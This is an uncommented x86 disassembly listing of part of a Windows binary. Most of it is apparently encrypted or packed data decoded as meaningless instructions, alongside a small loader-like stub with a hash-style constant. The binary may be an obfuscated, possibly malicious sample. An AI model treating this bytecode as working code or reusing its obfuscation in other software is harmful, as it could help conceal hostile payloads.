  422bbf:	mov    al,0xf
  422bc1:	test   bh,bh
  422bc3:	pop    edi
  422bc4:	jg     0x422bae
  422bc6:	fiadd  DWORD PTR [ebp-0x80]
  422bc9:	jo     0x422b87
  422bcb:	dec    esp
  422bcc:	jmp    0x422b74
  422bce:	dec    ecx
  422bcf:	or     eax,0x25c602dd
  422bd4:	dec    ebp
  422bd5:	dec    edx
  422bd6:	adc    al,0xeb
  422bd8:	cli    
  422bd9:	pop    es
  422bda:	push   ss
  422bdb:	dec    ebx
  422bdc:	xchg   esp,eax
  422bdd:	ret    0x78de
  422be0:	rcl    BYTE PTR [ebp+0x57],0x3a
  422be4:	fadd   QWORD PTR [esi+edi*1]
  422be7:	gs xor al,0x3b
  422bea:	(bad)  
  422beb:	ds (bad) 
  422bed:	lea    ebp,[esi+0xe444a20]
  422bf3:	or     edx,0xffffffcf
  422bf6:	xchg   esp,eax
  422bf7:	push   ds
  422bf8:	out    0x4a,eax
  422bfa:	mov    edx,DWORD PTR [ecx-0x2419e335]
  422c00:	lock xchg edx,eax
  422c02:	xor    eax,0x47e83879
  422c07:	push   edx
  422c08:	adc    al,0xe1
  422c0a:	loop   0x422c7d
  422c0c:	pop    ecx
  422c0d:	jns    0x422c57
  422c0f:	xor    ebp,DWORD PTR ds:0x41eae565
  422c15:	pop    eax
  422c16:	mov    esi,0xcda07474
  422c1b:	(bad)  
  422c1c:	cld    
  422c1d:	call   0xf7cd:0xe15cb3b8
  422c24:	inc    ecx
  422c25:	mov    al,0x9a
  422c27:	jp     0x422c71
  422c29:	xchg   edi,eax
  422c2a:	mov    ebx,0x59c2cc7e
  422c2f:	inc    edx
  422c30:	lods   al,BYTE PTR ds:[esi]
  422c31:	mov    esi,0xec096cd6
  422c36:	ror    esi,cl
  422c38:	scas   eax,DWORD PTR es:[edi]
  422c39:	sbb    dh,dl
  422c3b:	ds pusha 
  422c3d:	cmp    al,0x70
  422c3f:	mov    bh,0x28
  422c41:	test   eax,0x778c2950
  422c46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c47:	sub    dl,0xfc
  422c4a:	sub    BYTE PTR [ebx],ch
  422c4c:	or     edi,DWORD PTR [ebp-0x55]
  422c4f:	outs   dx,DWORD PTR ds:[esi]
  422c50:	pop    ebp
  422c51:	cmp    DWORD PTR [edi-0x6d],ebp
  422c54:	hlt    
  422c55:	in     eax,0xfa
  422c57:	mov    eax,0xd3cb34d3
  422c5c:	inc    esp
  422c5d:	dec    ecx
  422c5e:	mov    bh,0x2e
  422c60:	mov    bh,BYTE PTR [esi+edx*2+0x277e0419]
  422c67:	and    bh,bh
  422c69:	mov    ah,BYTE PTR [ebx]
  422c6b:	popa   
  422c6c:	cwde   
  422c6d:	jbe    0x422c0b
  422c6f:	test   eax,0x72d89c1b
  422c74:	ins    DWORD PTR es:[edi],dx
  422c75:	jge    0x422c08
  422c77:	add    al,0x9
  422c79:	in     al,dx
  422c7a:	fidivr DWORD PTR [ebp+0x32923098]
  422c80:	aaa    
  422c81:	xor    ecx,ebx
  422c83:	xor    cl,BYTE PTR [ebp+esi*1-0x66]
  422c87:	mov    dl,0xaf
  422c89:	repnz adc eax,0xff43c9c8
  422c8f:	and    eax,0x8e45afd6
  422c94:	in     al,0xd5
  422c96:	xchg   ebx,eax
  422c97:	sbb    bh,BYTE PTR [ecx-0x3c79889b]
  422c9d:	mov    esp,0x6a902ca2
  422ca2:	retf   0x3228
  422ca5:	xor    DWORD PTR [edx-0x40fa597a],esi
  422cab:	adc    BYTE PTR [edi-0x73],cl
  422cae:	push   eax
  422caf:	cmp    DWORD PTR [edi-0x20],ebp
  422cb2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422cb3:	xchg   edx,eax
  422cb4:	and    DWORD PTR ds:0x9de77ba6,edi
  422cba:	jnp    0x422c73
  422cbc:	int    0x6e
  422cbe:	jnp    0x422cb7
  422cc0:	enter  0x6a62,0xee
  422cc4:	add    ecx,DWORD PTR [edi+0x76]
  422cc7:	adc    DWORD PTR [esi+0x727d2b39],edx
  422ccd:	add    DWORD PTR [ebx-0x16],esp
  422cd0:	push   eax
  422cd1:	fadd   DWORD PTR [esi+0x1c]
  422cd4:	jle    0x422cbd
  422cd6:	push   ecx
  422cd7:	jmp    0xabec:0x48ac6925
  422cde:	dec    ecx
  422cdf:	mov    al,0xfe
  422ce1:	sbb    DWORD PTR [edi],esp
  422ce3:	in     al,0x11
  422ce5:	out    0x8b,al
  422ce7:	xchg   edx,eax
  422ce8:	push   edi
  422ce9:	mov    dh,0xa8
  422ceb:	je     0x422d00
  422ced:	cmp    al,0x83
  422cef:	inc    ebx
  422cf0:	aam    0xd7
  422cf2:	pop    eax
  422cf3:	aas    
  422cf4:	jecxz  0x422c84
  422cf6:	mov    BYTE PTR [ebx+0x63],al
  422cf9:	out    dx,al
  422cfa:	sub    eax,0xe8daedc1
  422cff:	aaa    
  422d00:	push   esp
  422d01:	adc    edx,DWORD PTR [edx]
  422d03:	jae    0x422cfd
  422d05:	and    ebp,ebp
  422d07:	ja     0x422cc0
  422d09:	add    eax,0x4a35530d
  422d0e:	out    0x8f,eax
  422d10:	sbb    ah,BYTE PTR [eax+0x32fa463b]
  422d16:	jns    0x422cd4
  422d18:	repnz imul BYTE PTR [eax-0x693acbc5]
  422d1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d20:	adc    eax,0xcf2574e0
  422d25:	imul   esp,DWORD PTR [ecx+esi*8+0x71872d94],0x978e179d
  422d30:	in     al,dx
  422d31:	dec    ebx
  422d32:	push   esi
  422d33:	dec    esp
  422d34:	cmc    
  422d35:	shl    BYTE PTR [edx],cl
  422d37:	mov    eax,ds:0x4dcb4538
  422d3c:	ins    BYTE PTR es:[edi],dx
  422d3d:	ret    0x5482
  422d40:	xchg   ecx,eax
  422d41:	mov    ch,0x2a
  422d43:	dec    esi
  422d44:	pop    es
  422d45:	shr    BYTE PTR [eax+ecx*1-0x42],0x49
  422d4a:	and    BYTE PTR [esi+0x5b],dh
  422d4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d4e:	pop    edx
  422d4f:	or     ch,dl
  422d51:	fidivr DWORD PTR [edx+0x237c6726]
  422d57:	xchg   esi,eax
  422d58:	mov    cl,0xdd
  422d5a:	ins    DWORD PTR es:[edi],dx
  422d5b:	pop    edx
  422d5c:	push   0xffffffb0
  422d5e:	pop    edx
  422d5f:	je     0x422dd2
  422d61:	rcl    BYTE PTR [ebx*4-0x4ab7860e],0x6d
  422d69:	and    esi,DWORD PTR [ecx]
  422d6b:	fwait
  422d6c:	pop    es
  422d6d:	jae    0x422d68
  422d6f:	js     0x422db5
  422d71:	js     0x422dde
  422d73:	dec    esp
  422d74:	inc    bp
  422d76:	pop    eax
  422d77:	mov    ds,WORD PTR fs:[edi+0x7b34b28a]
  422d7e:	cld    
  422d7f:	sbb    edx,DWORD PTR [ebx]
  422d81:	fimul  DWORD PTR [edx+0x6]
  422d84:	cmp    esp,eax
  422d86:	jne    0x422d73
  422d88:	sahf   
  422d89:	pop    ebp
  422d8a:	mov    WORD PTR [edx-0x74],cs
  422d8d:	lods   eax,DWORD PTR ds:[esi]
  422d8e:	in     al,0xc
  422d90:	mov    ds:0x87c2eb5b,al
  422d95:	sbb    DWORD PTR [ebx+ebx*8],esi
  422d98:	cmp    DWORD PTR [edi+eiz*1+0x79],0xa6f34b00
  422da0:	xchg   edi,eax
  422da1:	xlat   BYTE PTR ds:[ebx]
  422da2:	(bad)  [eax]
  422da4:	add    BYTE PTR [edx],dh
  422da6:	pusha  
  422da7:	add    ch,BYTE PTR [ebx+0x184bbf39]
  422dad:	adc    dh,BYTE PTR [edi]
  422daf:	sbb    eax,0x2cbe1f38
  422db4:	inc    edi
  422db5:	lahf   
  422db6:	mov    ?,WORD PTR [ebx+0x264da47f]
  422dbc:	neg    esp
  422dbe:	in     eax,dx
  422dbf:	pusha  
  422dc0:	lahf   
  422dc1:	and    eax,0x2775a110
  422dc6:	mov    WORD PTR [esi-0x2c],gs
  422dc9:	iret   
  422dca:	add    al,BYTE PTR [esi+0x52232288]
  422dd0:	mov    al,0x10
  422dd2:	bound  esp,QWORD PTR [edi-0x494404c2]
  422dd8:	iret   
  422dd9:	jp     0x422e30
  422ddb:	repnz fidiv DWORD PTR [ebx+0x24bdce39]
  422de2:	mov    ecx,0x980f193c
  422de7:	rcl    BYTE PTR [edi-0x41c5b5ad],0xcf
  422dee:	and    al,0xef
  422df0:	int3   
  422df1:	imul   esi,DWORD PTR [edi],0x3dd48cdd
  422df7:	pop    ds
  422df8:	push   0xffffff9a
  422dfa:	mov    BYTE PTR [edi-0x724c6a20],dh
  422e00:	es test eax,0xe8b0946c
  422e06:	data16 rcr BYTE PTR [esi-0x302aea04],0xd6
  422e0e:	mov    ds:0x823be4dc,eax
  422e13:	jle    0x422e1d
  422e15:	pinsrw mm4,edx,0x20
  422e19:	or     BYTE PTR [esi-0x6f33eac1],bh
  422e1f:	jmp    0x422e9f
  422e21:	push   ss
  422e22:	sbb    ebx,DWORD PTR [ecx-0x370ffcbf]
  422e28:	jo     0x422e12
  422e2a:	js     0x422dc6
  422e2c:	lahf   
  422e2d:	push   ds
  422e2e:	or     edx,DWORD PTR [edx-0x3c]
  422e31:	sbb    DWORD PTR [edi],edi
  422e33:	fsub   QWORD PTR [edi+0x77b322f5]
  422e39:	jp     0x422e09
  422e3b:	aad    0x48
  422e3d:	sbb    al,0x13
  422e3f:	div    bh
  422e41:	and    cl,0x41
  422e44:	adc    DWORD PTR [edx],eax
  422e46:	inc    esp
  422e47:	adc    bl,cl
  422e49:	mov    edx,0x422574ff
  422e4e:	repz push edx
  422e50:	outs   dx,BYTE PTR ds:[esi]
  422e51:	pop    es
  422e52:	dec    ebx
  422e53:	add    BYTE PTR [esi-0x6ff8aad9],bh
  422e59:	inc    ebx
  422e5a:	push   es
  422e5b:	and    al,dh
  422e5d:	mov    edi,0x1c59138b
  422e62:	out    dx,eax
  422e63:	call   0x36143672
  422e68:	std    
  422e69:	xchg   esp,eax
  422e6a:	scas   al,BYTE PTR es:[edi]
  422e6b:	(bad)  
  422e6c:	loope  0x422e45
  422e6e:	lods   al,BYTE PTR ds:[esi]
  422e6f:	loope  0x422eee
  422e71:	add    DWORD PTR [eax],ebp
  422e73:	int3   
  422e74:	pop    esp
  422e75:	cmp    BYTE PTR [edx+eiz*8-0x60],dl
  422e79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e7a:	out    0xe8,eax
  422e7c:	ins    BYTE PTR es:[edi],dx
  422e7d:	mov    eax,0xadb40da1
  422e82:	mov    ch,BYTE PTR [ebx+0x56]
  422e85:	fs jb  0x422e66
  422e88:	out    0x15,al
  422e8a:	or     ebx,DWORD PTR [edi]
  422e8c:	jp     0x422e34
  422e8e:	test   DWORD PTR [ebp-0x2509196],ebx
  422e94:	jge    0x422ea5
  422e96:	pop    es
  422e97:	in     al,0x32
  422e99:	in     eax,0x73
  422e9b:	lea    edi,[esi]
  422e9d:	or     al,0x8d
  422e9f:	jg     0x422f1b
  422ea1:	out    dx,al
  422ea2:	mov    DWORD PTR [ecx+0x64],edx
  422ea5:	ds push esp
  422ea7:	xlat   BYTE PTR ds:[ebx]
  422ea8:	fwait
  422ea9:	test   eax,0xd0aabdb1
  422eae:	adc    ebp,ebx
  422eb0:	xchg   ebx,eax
  422eb1:	shl    DWORD PTR [ebp-0x55982e60],1
  422eb7:	leave  
  422eb8:	dec    ecx
  422eb9:	cli    
  422eba:	sub    ebx,edx
  422ebc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ebd:	repz sub eax,0x26deb18f
  422ec3:	mov    ebp,0x3849c0c
  422ec8:	jmp    DWORD PTR [edx-0x18]
  422ecb:	jg     0x422e8f
  422ecd:	cmp    esi,0x39
  422ed0:	mov    cl,0x76
  422ed2:	std    
  422ed3:	inc    esp
  422ed4:	jne    0x422ef5
  422ed6:	push   cs
  422ed7:	test   BYTE PTR [ebx+eiz*2+0x6c],0xcb
  422edc:	fwait
  422edd:	cmp    al,0xf9
  422edf:	dec    DWORD PTR ds:[esi]
  422ee2:	ins    DWORD PTR es:[edi],dx
  422ee3:	add    DWORD PTR [ebp-0x4a],esp
  422ee6:	fstp   st(2)
  422ee8:	xor    al,0x35
  422eea:	push   ebx
  422eeb:	cmp    BYTE PTR [ebp-0x56],cl
  422eee:	cli    
  422eef:	and    eax,0xca05de59
  422ef4:	adc    esi,DWORD PTR [edi+0x2a829479]
  422efa:	cli    
  422efb:	xchg   esi,eax
  422efc:	shl    edi,cl
  422efe:	cwde   
  422eff:	add    eax,0x8b7a127e
  422f04:	cld    
  422f05:	jbe    0x422ef9
  422f07:	repnz adc ebp,DWORD PTR [esi]
  422f0a:	and    BYTE PTR [esp+ecx*4],ch
  422f0d:	add    DWORD PTR [eax],ebx
  422f0f:	cmp    cl,BYTE PTR [ecx+0x78]
  422f12:	je     0x422e9b
  422f14:	xor    eax,DWORD PTR [edi]
  422f16:	or     al,0xa0
  422f18:	jne    0x422eb2
  422f1a:	cmpxchg DWORD PTR [edx],eax
  422f1d:	pop    edx
  422f1e:	mov    al,ds:0xd257bbc6
  422f23:	fisub  DWORD PTR ds:0xb64d83ff
  422f29:	mov    eax,0x1
  422f2e:	mov    esp,ebp
  422f30:	pop    ebp
  422f31:	ret    
  422f32:	int3   
  422f33:	int3   
  422f34:	int3   
  422f35:	int3   
  422f36:	int3   
  422f37:	int3   
  422f38:	int3   
  422f39:	int3   
  422f3a:	int3   
  422f3b:	int3   
  422f3c:	int3   
  422f3d:	int3   
  422f3e:	int3   
  422f3f:	int3   
  422f40:	push   ebp
  422f41:	mov    ebp,esp
  422f43:	sub    esp,0x8
  422f46:	mov    eax,ds:0x429028
  422f4b:	push   esi
  422f4c:	push   0x0
  422f4e:	push   0x4e
  422f50:	push   0x1e
  422f52:	push   0x0
  422f54:	push   0xffffffff
  422f56:	mov    DWORD PTR [ebp-0x4],0x0
  422f5d:	mov    DWORD PTR [ebp-0x8],eax
  422f60:	call   DWORD PTR ds:0x429038
  422f66:	mov    esi,DWORD PTR [ebp-0x8]
  422f69:	call   esi
  422f6b:	mov    DWORD PTR [ebp-0x4],eax
  422f6e:	cmp    DWORD PTR [ebp-0x4],0x57
  422f72:	jne    0x422f81
  422f74:	push   0x28f80d53
  422f79:	call   0x4111f0
  422f7e:	add    esp,0x4
  422f81:	xor    eax,eax
  422f83:	pop    esi
  422f84:	mov    esp,ebp
  422f86:	pop    ebp
  422f87:	ret    
  422f88:	nop
  422f89:	nop
  422f8a:	nop
  422f8b:	nop
  422f8c:	nop
  422f8d:	nop
  422f8e:	nop
  422f8f:	nop
  422f90:	sub    esp,0x10
  422f93:	push   0x0
  422f95:	push   0x0
  422f97:	push   0x0
  422f99:	call   DWORD PTR ds:0x429034
  422f9f:	lea    eax,[esp+0x0]
  422fa3:	push   eax
  422fa4:	call   DWORD PTR ds:0x42903c
  422faa:	cmp    WORD PTR [esp+0x0],0x0
  422fb0:	je     0x422fd2
  422fb2:	push   0x0
  422fb4:	call   0x422f40
  422fb9:	add    esp,0x4
  422fbc:	call   0x411000
  422fc1:	push   0x0
  422fc3:	push   0x0
  422fc5:	call   0x424410
  422fca:	xor    eax,eax
  422fcc:	add    esp,0x10
  422fcf:	ret    0x10
  422fd2:	push   DWORD PTR [esi+edi*4-0x15]
  422fd6:	not    ecx
  422fd8:	sbb    eax,0xd977cebe
  422fdd:	pop    edi
  422fde:	mov    ebp,0x7be4c6de
  422fe3:	dec    edi
  422fe4:	rcr    BYTE PTR ds:0xd973cebe,cl
  422fea:	pop    edi
  422feb:	std    
  422fec:	and    DWORD PTR [ecx],edi
  422fee:	in     al,0x7b
  422ff0:	not    edx
  422ff2:	sbb    eax,0xd973cebe
  422ff7:	pop    edi
  422ff8:	mov    ebp,0x7be43921
  422ffd:	not    edx
  422fff:	sbb    eax,0xd973cebe
  423004:	pop    edi
  423005:	mov    ebp,0x7be43921
  42300a:	not    edx
  42300c:	sbb    eax,0xd98bcebe
  423011:	pop    edi
  423012:	mov    ebp,0x755e262f
  423017:	mul    DWORD PTR [esi+0x14]
  42301a:	jae    0x42300b
  42301c:	retf   
  42301d:	fcom   DWORD PTR [ebx]
  42301f:	jo     0x423021
  423021:	ins    DWORD PTR es:[edi],dx
  423022:	mov    WORD PTR [edx],ss
  423024:	test   dl,dh
  423026:	ins    DWORD PTR es:[edi],dx
  423027:	int3   
  423028:	mov    eax,ds:0xd03eab14
  42302d:	add    DWORD PTR [edx-0x7b],ebx
  423030:	adc    eax,0x9e69bd99
  423035:	lods   al,BYTE PTR ds:[esi]
  423036:	push   ss
  423037:	stc    
  423038:	sub    eax,0x8d194fc8
  42303d:	adc    eax,0xed5296d7
  423042:	out    dx,al
  423043:	push   ds
  423044:	mov    dh,0x3b
  423046:	fmul   DWORD PTR [edi]
  423048:	xor    al,0xe9
  42304a:	jno    0x42301f
  42304c:	rcr    BYTE PTR ds:0xd973cebe,cl
  423052:	pop    edi
  423053:	mov    edx,0x38bdc5b8
  423058:	cmovo  edx,DWORD PTR [edi]
  42305b:	std    
  42305c:	ss loope 0x423032
  42305f:	sbb    al,0x45
  423061:	mov    bl,0x33
  423063:	mov    esp,0x42d8fb1e
  423068:	inc    esi
  423069:	pop    esp
  42306a:	jns    0x422fed
  42306c:	cmp    al,BYTE PTR [ebp-0x16e304d5]
  423072:	std    
  423073:	mov    bh,BYTE PTR [eax-0x79]
  423076:	les    ebx,FWORD PTR [ebx]
  423078:	and    ebp,ecx
  42307a:	mov    bh,0xd
  42307c:	mov    bh,0xdd
  42307e:	jno    0x423031
  423080:	sub    cl,BYTE PTR [edi-0x370c7b4c]
  423086:	push   ebp
  423087:	neg    ecx
  423089:	stos   DWORD PTR es:[edi],eax
  42308a:	out    dx,al
  42308b:	xor    DWORD PTR [edi-0x2d],esi
  42308e:	pop    ss
  42308f:	out    0x36,al
  423091:	loope  0x423066
  423093:	sbb    al,0x45
  423095:	mov    dl,0x33
  423097:	int3   
  423098:	and    BYTE PTR [ebp-0x28],0xa2
  42309c:	dec    si
  42309e:	jns    0x423034
  4230a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230a1:	das    
  4230a2:	sub    esp,DWORD PTR [ecx-0x7f]
  4230a5:	inc    esi
  4230a6:	std    
  4230a7:	(bad)  
  4230a9:	sub    al,0xc4
  4230ab:	sub    edi,DWORD PTR [edi+edx*2+0x76c163b7]
  4230b2:	jno    0x423063
  4230b4:	mov    bh,0x12
  4230b6:	mov    ah,0x8c
  4230b8:	mov    ecx,DWORD PTR [ebx+0x55]
  4230bb:	out    dx,eax
  4230bc:	dec    eax
  4230bd:	pop    edx
  4230be:	mov    WORD PTR [eax],?
  4230c0:	cmovo  edx,DWORD PTR [edi]
  4230c3:	mov    esi,0x5fd973ce
  4230c8:	mov    ebp,0x3eb43921
  4230cd:	not    edx
  4230cf:	push   ecx
  4230d0:	mov    edi,0xbc3573cc
  4230d5:	loop   0x423145
  4230d7:	cmp    esp,esp
  4230d9:	jnp    0x4230d2
  4230db:	rcr    BYTE PTR ds:0xd993cebe,cl
  4230e1:	pop    esp
  4230e2:	mov    esp,0x7bee382a
  4230e7:	idiv   DWORD PTR [esi]
  4230e9:	sbb    DWORD PTR [esi+0x5fdf77ce],edi
  4230ef:	mov    ebp,0x7ae43921
  4230f4:	dec    edx
  4230f5:	rcr    BYTE PTR ds:0xd973debe,cl
  4230fb:	pop    edi
  4230fc:	mov    ebp,0x7be43924
  423101:	mov    dh,0xd2
  423103:	sbb    eax,0xd973ceae
  423108:	pop    ebp
  423109:	mov    ebp,0x7ae43c21
  42310e:	not    edx
  423110:	sbb    eax,0xd976cebe
  423115:	pop    esi
  423116:	mov    ebp,0x7be43921
  42311b:	not    DWORD PTR [edx+0x16]
  42311e:	mov    esi,0x5fd977ce
  423123:	add    BYTE PTR [eax],dl
  423125:	cmp    al,0xe4
  423127:	jns    0x423120
  423129:	rcr    BYTE PTR [ebp-0x269c3142],cl
  42312f:	pop    edi
  423130:	lods   eax,DWORD PTR ds:[esi]
  423131:	and    DWORD PTR [ecx],edi
  423133:	in     al,0x7b
  423135:	out    0xd2,eax
  423137:	sbb    eax,0xd973ceae
  42313c:	pop    edi
  42313d:	mov    ebp,0x7be42921
  423142:	not    edx
  423144:	sbb    eax,0xd973cebe
  423149:	pop    edi
  42314a:	mov    ebp,0x7bef57a5
  42314f:	sahf   
  423150:	rcr    DWORD PTR ds:0xd243cebe,1
  423156:	pop    edi
  423157:	jb     0x423175
  423159:	cmp    esp,esp
  42315b:	jnp    0x423154
  42315d:	rcr    BYTE PTR ds:0xd973cebe,cl
  423163:	pop    edi
  423164:	mov    ebp,0x7be43921
  423169:	not    edx
  42316b:	sbb    eax,0xd973cebe
  423170:	pop    edi
  423171:	mov    ebp,0x7be43921
  423176:	not    edx
  423178:	sbb    eax,0xd973cebe
  42317d:	pop    edi
  42317e:	mov    ebp,0x7be43921
  423183:	not    edx
  423185:	sbb    eax,0xd973cebe
  42318a:	pop    edi
  42318b:	mov    ebp,0x7be43921
  423190:	not    edx
  423192:	sbb    eax,0xd973cebe
  423197:	pop    edi
  423198:	mov    ebp,0x7be43921
  42319d:	not    edx
  42319f:	sbb    eax,0xd973cebe
  4231a4:	pop    edi
  4231a5:	mov    ebp,0x7be43921
  4231aa:	not    edx
  4231ac:	sbb    eax,0xd973cebe
  4231b1:	pop    edi
  4231b2:	mov    ebp,0x7be43921
  4231b7:	not    edx
  4231b9:	sbb    eax,0xd973cebe
  4231be:	pop    edi
  4231bf:	mov    ebp,0x55e43921
  4231c4:	xor    DWORD PTR [edi+0x73ceca65],0xffffffd9
  4231cb:	pop    edi
  4231cc:	popf   
  4231cd:	sub    bh,BYTE PTR [ecx]
  4231cf:	in     al,0x6b
  4231d1:	not    edx
  4231d3:	sbb    eax,0xd973ca84
  4231d8:	pop    ebx
  4231d9:	mov    ebp,0x38a16921
  4231de:	lds    eax,FWORD PTR [esi+0x73cebe52]
  4231e4:	fstp   DWORD PTR [edi-0x43]
  4231e7:	add    DWORD PTR [ecx],edi
  4231e9:	in     al,0x9b
  4231eb:	fldenv [eax+0x73adcc6e]
  4231f1:	fstp   DWORD PTR [edi-0x43]
  4231f4:	jno    0x42322f
  4231f6:	in     al,0x7b
  4231f8:	(bad)  
  4231f9:	fstp   DWORD PTR ds:0xd9739ebe
  4231ff:	pop    edi
  423200:	and    DWORD PTR ds:0xf77be439,0xffffffd2
  423207:	sbb    eax,0xd973cebe
  42320c:	pop    edi
  42320d:	mov    ebp,0x7be41921
  423212:	pop    ss
  423213:	rcr    BYTE PTR ds:0xd973cebe,cl
  423219:	pop    edi
  42321a:	mov    ebp,0x7be43921
  42321f:	not    edx
  423221:	sbb    eax,0xd973cebe
  423226:	pop    edi
  423227:	mov    ebp,0x7be43921
  42322c:	not    edx
  42322e:	sbb    eax,0xd973cebe
  423233:	pop    edi
  423234:	mov    ebp,0x7be43921
  423239:	not    edx
  42323b:	sbb    eax,0xd973cebe
  423240:	pop    edi
  423241:	mov    ebp,0x7be43921
  423246:	not    edx
  423248:	sbb    eax,0xd973cebe
  42324d:	pop    edi
  42324e:	mov    ebp,0x7be43921
  423253:	not    edx
  423255:	sbb    eax,0xd973cebe
  42325a:	pop    edi
  42325b:	mov    ebp,0x7be43921
  423260:	not    edx
  423262:	sbb    eax,0xd973cebe
  423267:	pop    edi
  423268:	mov    ebp,0x7be43921
  42326d:	not    edx
  42326f:	sbb    eax,0xd973cebe
  423274:	pop    edi
  423275:	mov    ebp,0x7be43921
  42327a:	not    edx
  42327c:	sbb    eax,0xd973cebe
  423281:	pop    edi
  423282:	mov    ebp,0x7be43921
  423287:	not    edx
  423289:	sbb    eax,0xd973cebe
  42328e:	pop    edi
  42328f:	mov    ebp,0x7be43921
  423294:	not    edx
  423296:	sbb    eax,0xd973cebe
  42329b:	pop    edi
  42329c:	mov    ebp,0x7be43921
  4232a1:	not    edx
  4232a3:	sbb    eax,0xd973cebe
  4232a8:	pop    edi
  4232a9:	mov    ebp,0x7be43921
  4232ae:	not    edx
  4232b0:	sbb    eax,0xd973cebe
  4232b5:	pop    edi
  4232b6:	mov    ebp,0x7be43921
  4232bb:	not    edx
  4232bd:	sbb    eax,0xd973cebe
  4232c2:	pop    edi
  4232c3:	mov    ebp,0x7be43921
  4232c8:	not    edx
  4232ca:	sbb    eax,0xd973cebe
  4232cf:	pop    edi
  4232d0:	mov    ebp,0x7be43921
  4232d5:	not    edx
  4232d7:	sbb    eax,0xd973cebe
  4232dc:	pop    edi
  4232dd:	mov    ebp,0x7be43921
  4232e2:	not    edx
  4232e4:	sbb    eax,0xd973cebe
  4232e9:	pop    edi
  4232ea:	mov    ebp,0x7be43921
  4232ef:	not    edx
  4232f1:	sbb    eax,0xd973cebe
  4232f6:	pop    edi
  4232f7:	mov    ebp,0x7be43921
  4232fc:	not    edx
  4232fe:	sbb    eax,0xd973cebe
  423303:	pop    edi
  423304:	mov    ebp,0x7be43921
  423309:	not    edx
  42330b:	sbb    eax,0xd973cebe
  423310:	pop    edi
  423311:	mov    ebp,0x7be43921
  423316:	not    edx
  423318:	sbb    eax,0xd973cebe
  42331d:	pop    edi
  42331e:	mov    ebp,0x7be43921
  423323:	not    edx
  423325:	sbb    eax,0xd973cebe
  42332a:	pop    edi
  42332b:	mov    ebp,0x7be43921
  423330:	not    edx
  423332:	sbb    eax,0xd973cebe
  423337:	pop    edi
  423338:	mov    ebp,0x7be43921
  42333d:	not    edx
  42333f:	sbb    eax,0xd973cebe
  423344:	pop    edi
  423345:	mov    ebp,0x7be43921
  42334a:	not    edx
  42334c:	sbb    eax,0xd973cebe
  423351:	pop    edi
  423352:	mov    ebp,0x7be43921
  423357:	not    edx
  423359:	sbb    eax,0xd973cebe
  42335e:	pop    edi
  42335f:	mov    ebp,0x7be43921
  423364:	not    edx
  423366:	sbb    eax,0xd973cebe
  42336b:	pop    edi
  42336c:	mov    ebp,0x7be43921
  423371:	not    edx
  423373:	sbb    eax,0xd973cebe
  423378:	pop    edi
  423379:	mov    ebp,0x7be43921
  42337e:	not    edx
  423380:	sbb    eax,0xd973cebe
  423385:	pop    edi
  423386:	mov    ebp,0x7be43921
  42338b:	not    edx
  42338d:	sbb    eax,0xd973cebe
  423392:	pop    edi
  423393:	mov    ebp,0x7be43921
  423398:	not    edx
  42339a:	sbb    eax,0xd973cebe
  42339f:	pop    edi
  4233a0:	mov    ebp,0x7be43921
  4233a5:	not    edx
  4233a7:	sbb    eax,0xd973cebe
  4233ac:	pop    edi
  4233ad:	mov    ebp,0x7be43921
  4233b2:	not    edx
  4233b4:	sbb    eax,0xd973cebe
  4233b9:	pop    edi
  4233ba:	mov    ebp,0x7be43921
  4233bf:	not    edx
  4233c1:	sbb    eax,0xd973cebe
  4233c6:	pop    edi
  4233c7:	mov    ebp,0x7be43921
  4233cc:	not    edx
  4233ce:	sbb    eax,0xd973cebe
  4233d3:	sbb    BYTE PTR [ebx+0x2b],dl
  4233d6:	cmp    ebx,ecx
  4233d8:	jnp    0x4233d1
  4233da:	ret    0xbe1d
  4233dd:	in     al,0xd1
  4233df:	add    ebp,DWORD PTR [esi]
  4233e1:	fcmovnu st,st(6)
  4233e3:	adc    al,0x7a
  4233e5:	cld    
  4233e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233e7:	aas    
  4233e8:	sub    edx,DWORD PTR [esi-0x23]
  4233eb:	(bad)  
  4233ec:	dec    esp
  4233ed:	cmp    esp,ecx
  4233ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233f0:	arpl   di,si
  4233f2:	retf   0xc440
  4233f5:	jo     0x423451
  4233f7:	inc    esp
  4233f8:	repnz pop ds
  4233fa:	jno    0x4233db
  4233fc:	mov    cl,0x6
  4233fe:	fisttp QWORD PTR [eax-0x48]
  423401:	arpl   WORD PTR [edx],cx
  423403:	pushf  
  423404:	into   
  423405:	push   esp
  423406:	jle    0x4233df
  423408:	call   0x498f887d
  42340d:	retf   0x90f
  423410:	xsave  [ebx-0x7e]
  423414:	jns    0x4233c2
  423416:	into   
  423417:	push   eax
  423418:	inc    ebp
  423419:	pop    ss
  42341a:	adc    BYTE PTR [eax+0x31],ch
  42341d:	jns    0x423462
  42341f:	daa    
  423420:	daa    
  423421:	imul   ecx,ebp,0xdbe6a0ec
  423427:	ds (bad) 
  423429:	mov    al,bh
  42342b:	icebp  
  42342c:	outs   dx,DWORD PTR ds:[esi]
  42342d:	lods   al,BYTE PTR ds:[esi]
  42342e:	inc    edx
  42342f:	or     al,0x8f
  423431:	out    dx,al
  423432:	jg     0x4233d7
  423434:	mov    al,0x98
  423436:	adc    edi,esi
  423438:	ret    
  423439:	pop    ds
  42343a:	arpl   bp,dx
  42343c:	mov    al,0x69
  42343e:	mov    DWORD PTR [edx],0x78d8ca8c
  423444:	call   0x9f89e4c1
  423449:	(bad)  
  42344b:	jb     0x4233f4
  42344d:	lahf   
  42344e:	adc    eax,0x4df5cd3b
  423453:	stos   DWORD PTR es:[edi],eax
  423454:	repnz (bad) 
  423456:	mov    ecx,0x3f7ab2ca
  42345b:	adc    eax,0xc99d6f05
  423460:	pop    esi
  423461:	or     cl,BYTE PTR [edi-0x539cbb64]
  423467:	inc    ebp
  423468:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423469:	push   ecx
  42346a:	sar    ebp,1
  42346c:	sbb    bl,BYTE PTR [eax-0x14984825]
  423472:	sti    
  423473:	mov    ah,0x56
  423475:	rcr    DWORD PTR [ebx+ebp*4+0x1a97b385],1
